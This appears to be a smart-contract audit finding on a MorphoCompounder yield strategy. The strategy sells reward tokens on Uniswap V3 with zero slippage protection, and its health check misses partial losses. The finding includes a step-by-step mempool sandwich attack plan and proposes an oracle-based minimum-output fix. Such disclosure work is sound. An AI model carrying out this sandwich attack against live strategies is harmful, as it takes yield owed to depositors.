# Contracts & call flow

**report path:**

1): keeper calls `TokenizedStrategy.report()` (`external, onlyKeepers`)
2): `report()` calls the strategy implementation via delegatecall:

```solidity
uint256 newTotalAssets = IBaseStrategy(address(this)).harvestAndReport();
```
3): because `MorphoCompounder` inherits `Base4626Compounder -> BaseHealthCheck -> BaseStrategy`, the `harvestAndReport()` that actually runs is the one in `BaseHealthCheck`, not the bare `BaseStrategy` one:

(https://katanascan.com/address/0xEA79C91540C7E884e6E0069Ce036E52f7BbB1194#code#L2457)

```solidity
function harvestAndReport()
    external
    override
    onlySelf
    returns (uint256 _totalAssets)
{
    _totalAssets = _harvestAndReport();
    _executeHealthCheck(_totalAssets);
}
```

4): `_harvestAndReport()` comes from `Base4626Compounder`:

```solidity
function _harvestAndReport()
    internal
    virtual
    override
    returns (uint256 _totalAssets)
{
    // Claim and sell any rewards.
    _claimAndSellRewards();
    // Return total balance
    _totalAssets = balanceOfAsset() + valueOfVault();
}
```
so harvest during report = call `_claimAndSellRewards()` + compute `totalAssets`

5): `_executeHealthCheck(_totalAssets)` enforces profit/loss bounds vs previous `totalAssets`:

```solidity
function _executeHealthCheck(uint256 _newTotalAssets) internal virtual {
    if (!doHealthCheck) {
        doHealthCheck = true;
        return;
    }

    uint256 currentTotalAssets = TokenizedStrategy.totalAssets();

    if (_newTotalAssets > currentTotalAssets) {
        require(
            (_newTotalAssets - currentTotalAssets)
                <= (currentTotalAssets * uint256(_profitLimitRatio)) / MAX_BPS,
            "healthCheck"
        );
    } else if (currentTotalAssets > _newTotalAssets) {
        require(
            (currentTotalAssets - _newTotalAssets)
                <= (currentTotalAssets * uint256(_lossLimitRatio)) / MAX_BPS,
            "healthCheck"
        );
    }
}
```

- defaults (constructor):
   - `doHealthCheck = true`
   - `_profitLimitRatio = MAX_BPS = 10_000` (100% profit per report allowed)
   - `_lossLimitRatio = 0` (no net loss vs last report allowed)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# MorphoCompounder : reward selling logic

- inherits: contract `MorphoCompounder` is `Base4626Compounder`, `UniswapV3Swapper { ... }`

stores:

```solidity
enum SwapType { NULL, UNISWAP_V3, AUCTION }

mapping(address => uint256) public minAmountToSellMapping;
mapping(address => SwapType) public swapType;
address[] public allRewardTokens;
```

constructor sets custom router and base (since it’s on another chain, but semantics same):

```solidity
constructor(address _asset, string memory _name, address _vault)
    Base4626Compounder(_asset, _name, _vault)
{
    router = <UniV3 router on that chain>;
    base   = <wrapped gas token on that chain>;
}
```

the critical override:

```solidity
function _claimAndSellRewards() internal override {
    address[] memory _allRewardTokens = allRewardTokens;
    uint256 _length = _allRewardTokens.length;

    for (uint256 i = 0; i < _length; i++) {
        address token = _allRewardTokens[i];
        SwapType _swapType = swapType[token];
        uint256 balance = ERC20(token).balanceOf(address(this));

        if (balance > minAmountToSellMapping[token]) {
            if (_swapType == SwapType.UNISWAP_V3) {
                _swapFrom(token, address(asset), balance, 0);
            }
        }
    }
}
```

**imp points:**

- for any reward token with `swapType[token] == UNISWAP_V3` nd balance above `minAmountToSellMapping[token]`,
- Strategy will sell full balance via `_swapFrom(...)` with `_minAmountOut = 0`

so reward‑selling behavior is literally:

> “Sell our entire reward balance at any price, as long as it’s above a dust threshold"


## UniswapV3Swapper:  forwarding _minAmountOut directly


contract UniswapV3Swapper's _swapFrom:

```solidity
function _swapFrom(
    address _from,
    address _to,
    uint256 _amountIn,
    uint256 _minAmountOut
) internal virtual returns (uint256 _amountOut) {
    if (_amountIn > minAmountToSell) {
        _checkAllowance(router, _from, _amountIn);

        if (_from == base || _to == base) {
            ISwapRouter.ExactInputSingleParams memory params =
                ISwapRouter.ExactInputSingleParams(
                    _from,
                    _to,
                    uniFees[_from][_to],
                    address(this),
                    block.timestamp,
                    _amountIn,
                    _minAmountOut,  // ← forwarded directly
                    0
                );

            _amountOut = ISwapRouter(router).exactInputSingle(params);
        } else {
            bytes memory path = abi.encodePacked(
                _from,
                uniFees[_from][base],
                base,
                uniFees[base][_to],
                _to
            );

            _amountOut = ISwapRouter(router).exactInput(
                ISwapRouter.ExactInputParams(
                    path,
                    address(this),
                    block.timestamp,
                    _amountIn,
                    _minAmountOut   // ← forwarded directly
                )
            );
        }
    }
}
```

**important details:**

- global `minAmountToSell` is only a dust gate: if `_amountIn > minAmountToSell` then swap happens
- actual slippage protection is purely `_minAmountOut`, which is passed straight to Uniswap’s `amountOutMinimum`
- MorphoCompounder always passes 0 for this `_minAmountOut`

## HealthCheck + accounting : is this really mitigate this risk?

- Base4626Compounder `_harvestAndReport`:

1): `_claimAndSellRewards()`: where the swap above is executed with `minOut = 0`
2): `_totalAssets = balanceOfAsset() + valueOfVault()` : this is the “truth” that gets reported to `TokenizedStrategy`

`BaseHealthCheck` harvest wrapper:

```solidity
function harvestAndReport()
    external
    override
    onlySelf
    returns (uint256 _totalAssets)
{
    _totalAssets = _harvestAndReport();   // includes that swap
    _executeHealthCheck(_totalAssets);    // compare vs last totalAssets
}
```

**HealthCheck logic (recap):**

- compares `_newTotalAssets` (after harvest) with `currentTotalAssets = TokenizedStrategy.totalAssets()` (before harvest)

Default ratios:

   - `profitLimitRatio = 10_000` -> up to +100% profit allowed in a single report (practically unbounded)
   - `lossLimitRatio = 0` -> any net loss vs last report reverts

- crucial nuance:

  if underlying yield > MEV loss:
   - `newTotalAssets still > currentTotalAssets` -> looks like a legitimate profit
   - HealthCheck only enforces too‑big profit or net loss, not “expected se kam profit”

so the attack that only skims a certain percentage of the profit is

- HealthCheck nahi revert karega,
- only “smaller profit” will record
- it can be done repeatedly on every report


## attack:

**1): strategy:** MorphoCompounder 
**2) Reward selling:**
   - `_harvestAndReport()` -> `_claimAndSellRewards()` ->  `_swapFrom(reward, asset, balance, 0)`
   - no slippage bound (`amountOutMinimum = 0`)
**3) swapper:**
   - `UniswapV3Swapper._swapFrom` forwards `_minAmountOut` -> Uniswap V3’s `amountOutMinimum`
   - only dust threshold is `minAmountToSell`, not price protection
**4) HealthCheck:**
   - `BaseHealthCheck.harvestAndReport()` wraps `_harvestAndReport()` and checks only net profit/loss vs last `totalAssets`
   - with defaults, any net profit is accepted even if much smaller than fair profit
**5) attack:**
- watch mempool for `report()` calls
- front‑run: trade R->asset heavily to push price down for R
- victim: strategy sells full `rewardBalance` at bad rate (no `minOut`)
- back‑run: buy back R cheaper, pocket `A_fair - A_actual` as profit
- HealthCheck still sees net positive `totalAssets`, so no revert
- repeat each harvest to skim a fraction of rewards

# impacts:

**what is actually stolen**

for a given harvest on reward token R:

- Strategy expects to receive `A_fair` asset
- due to sandwich, actually receives `A_actual`
- per‑harvest loss to depositors:

```bash
ΔA = A_fair - A_actual > 0
```

this ΔA is:

- yield that should have gone to users (their unclaimed rewards),
- but is instead captured by attacker as arbitrage profit

so:

> it is literally “theft of unclaimed yield”, not principal

nd because `amountOutMinimum = 0`, there is no hard upper bound on how bad a single swap can get (bounded only by how far attacker is willing/able to push the price before they arbitrage back)

**how can does this hit users**

- strategy’s job: `claim/sell` rewards -> convert to underlying -> increase `totalAssets` -> user APR
- every sandwiched harvest:
   - `totalAssets` still likely grows (if underlying yield positive),
   - but less than it should
   - users see lower APR than fair

over time:

repeated 0.5–5% skimming of reward value per harvest (very realistic in mid‑liquidity Uni V3 pools) can aggregate to a big fraction of the total yield

principal is not instantly stolen, but economically:

> users lose exactly that missing yield forever


# ideal mitigation:

use non‑zero `minAmountOut` on reward swaps

- for MorphoCompounder specifically, compute a `minOut` per reward token based on:
   - an oracle (e.g. TWAP, Chainlink) or
   - on‑chain spot price + some slippage BPS

example pattern (high‑level):

```solidity
uint256 quote = oracle.getQuote(rewardToken, asset, balance);
uint256 minOut = quote * minOutBps / 10_000; // e.g. minOutBps ~ 9900
_swapFrom(rewardToken, address(asset), balance, minOut);
```

that way, if attacker tries to push price too far, Uni V3 swap reverts instead of silently accepting bad rate
